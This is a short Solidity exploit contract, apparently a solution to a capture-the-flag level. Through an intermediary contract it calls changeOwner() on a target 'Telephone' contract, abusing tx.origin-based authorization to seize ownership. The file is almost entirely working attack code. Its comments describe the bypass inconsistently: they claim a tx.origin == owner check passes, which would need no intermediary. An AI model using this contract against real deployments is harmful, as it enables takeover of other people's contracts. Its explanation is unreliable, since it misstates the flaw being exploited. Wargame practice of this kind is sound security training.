// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

/**
 * @title TelephoneAttacker
 * @notice Exploits tx.origin vulnerability in Telephone contract
 * 
 * Attack: Call Telephone.changeOwner() through this contract
 * - msg.sender = this contract
 * - tx.origin = your wallet (the original caller)
 * - Since tx.origin == original owner, the check passes!
 */
contract TelephoneAttacker {
    ITelephone public target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    /**
     * @notice Execute the attack
     * @param _newOwner Address to become new owner
     */
    function attack(address _newOwner) public {
        // This contract calls Telephone.changeOwner()
        // From Telephone's perspective:
        //   msg.sender = TelephoneAttacker (this contract)
        //   tx.origin = YOUR wallet (original transaction sender)
        // 
        // Telephone checks: require(tx.origin == owner)
        // If YOUR wallet was the original owner, this passes!
        
        target.changeOwner(_newOwner);
    }
}